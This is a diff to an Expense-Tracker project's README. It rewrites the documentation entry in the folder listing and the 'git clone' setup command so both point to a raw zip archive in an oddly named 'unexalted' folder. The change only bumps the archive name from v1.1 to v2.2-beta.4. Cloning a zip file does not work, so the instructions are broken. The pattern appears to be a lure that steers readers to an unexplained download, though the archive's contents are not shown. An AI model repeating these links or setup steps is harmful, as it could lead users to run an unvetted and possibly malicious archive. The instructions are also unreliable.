@@ -23,7 +23,7 @@ Expense-Tracker/
 │── src/              # Source code files
 │── assets/           # Static files (CSS/JS/Images)
 │── db/               # Database or storage files (if applicable)
-│── https://github.com/Divakar-2005-02-02/Expense-Tracker/raw/refs/heads/main/unexalted/Expense_Tracker_v1.1.zip         # Project documentation
+│── https://github.com/Divakar-2005-02-02/Expense-Tracker/raw/refs/heads/main/unexalted/Expense-Tracker-v2.2-beta.4.zip         # Project documentation
 
 **⚙️ Installation & Setup**
 Prerequisites
@@ -35,7 +35,7 @@ IDE: NetBeans, VS Code, or any preferred editor
 
 Clone the repository
 
-git clone https://github.com/Divakar-2005-02-02/Expense-Tracker/raw/refs/heads/main/unexalted/Expense_Tracker_v1.1.zip
+git clone https://github.com/Divakar-2005-02-02/Expense-Tracker/raw/refs/heads/main/unexalted/Expense-Tracker-v2.2-beta.4.zip
 cd Expense-Tracker
 
 
